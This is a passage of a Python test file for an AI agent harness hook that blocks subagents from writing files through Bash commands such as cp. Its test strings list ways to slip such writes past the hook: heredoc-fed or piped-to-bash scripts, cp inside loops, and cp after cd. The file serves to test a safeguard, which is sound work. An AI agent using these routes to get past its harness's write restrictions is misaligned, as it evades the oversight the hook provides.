        repo_root = Path(__file__).resolve().parents[2]
        config = json.loads(
            (repo_root / "leaf_config" / "claude" / "settings.json").read_text(
                encoding="utf-8"
            )
        )
        allow = config.get("permissions", {}).get("allow", [])
        self.assertTrue(allow, "the leaf allow list must not be empty")
        for entry in allow:
            for name in sorted(cli._BASH_FILE_WRITE_COMMANDS):
                with self.subTest(entry=entry, name=name):
                    # A grant is `Bash(<prefix>*)`; the writer would have to appear
                    # at the head of that prefix for the command to be permitted.
                    inner = entry[len("Bash(") : -1] if entry.startswith("Bash(") else ""
                    self.assertNotEqual(inner.split(" ")[0].split("/")[-1], name)

    def test_shell_fed_writer_is_refused_at_the_handler(self) -> None:
        """Pinned at the HANDLER, not the helper: the raw command must be passed.

        `_detect_bash_write_commands` checks every word of the UNBLANKED command
        when a shell heads a fragment, and only `cli.main` has that string —
        `_blanked_command_and_scan` has already removed the heredoc body the
        script lives in. A mutation sweep found the wiring unpinned: the helper
        tests pass the raw command themselves, so they hold with `cli.main` no
        longer doing it, and `bash <<'EOF' … EOF` would reach the harness
        undecided.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_issue74_shellfed"
            run_id = "step_run_issue74_shellfed"
            self._setup(
                repo_root, orch=orch, run_id=run_id, tmp_root=f"workspace/tmp/{run_id}"
            )
            for command in (
                "bash <<'EOF'\ncp a.txt workspace/pipelines/evil.json\nEOF",
                "echo 'cp a.txt workspace/pipelines/evil.json' | bash",
            ):
                with self.subTest(command=command):
                    code, body = self._run_bash_hook(
                        orch=orch, repo_root=repo_root, command=command
                    )
                    self.assertEqual(code, 2, body)
                    self.assertEqual(body.get("decision"), "block", body)
                    self.assertIn("'cp'", body.get("reason", ""))

    def test_operator_session_outside_workflow_mode_is_not_refused(self) -> None:
        """The refusal is workflow-only, and this pins it at the handler.

        Since issue #102 an operator's interactive session does NOT run this hook —
        the DEV layer runs `tools/hooks/dev_cli.py`. What this pins is therefore about a
        LEAF outside workflow mode, which is the shape a standalone or misconfigured
        launch produces, and the judgement is unchanged: the refusal is workflow-only.
        The Bash branch is gated on `METFORGE_WORKFLOW_MODE == "1"` (`cli.py`'s
        step 3), and the operator owns the machine — refusing their `cp` would be
        an over-refusal with no leaf-shortcut to defend against.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_issue74_operator"
            run_id = "step_run_issue74_operator"
            self._setup(
                repo_root, orch=orch, run_id=run_id, tmp_root=f"workspace/tmp/{run_id}"
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "cp a.txt b.txt"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "0"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            self.assertEqual(out.getvalue().strip(), "")

    def test_file_write_command_is_refused_with_an_actionable_remedy(self) -> None:
        """TODO.md 378(d) end to end, and the remedy is checked, not just the block.

        The remedy is a CONJUNCTION for a copy — `Read` then `Write` — so the
        message has to say both halves: a leaf doing only the first writes nothing
        and reports done on an artifact that does not exist.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_issue74_argv"
            run_id = "step_run_issue74_argv"
            tmp_root = f"workspace/tmp/{run_id}"
            self._setup(repo_root, orch=orch, run_id=run_id, tmp_root=tmp_root)
            # Refused even when the destination is one the manifest WOULD allow:
            # the rule is the route, not the path.
            for command in (
                "cp a.txt workspace/pipelines/evil.json",
                f"cp a.txt {tmp_root}/b.txt",
                f"cd workspace; cp a.py {tmp_root}/b.txt",
                f"cp -t{tmp_root} a.txt",
                f"for f in *.py; do cp $f {tmp_root}/; done",
            ):
                with self.subTest(command=command):
                    code, body = self._run_bash_hook(
                        orch=orch, repo_root=repo_root, command=command
                    )
                    self.assertEqual(code, 2, body)
                    self.assertEqual(body.get("decision"), "block", body)
                    reason = body.get("reason", "")
                    self.assertIn("'cp'", reason)
                    self.assertIn("`Write` tool", reason)
                    # the copy remedy names BOTH halves
                    self.assertIn("`Read` it and", reason)
                    self.assertIn("both halves are", reason)

if __name__ == "__main__":
    unittest.main()
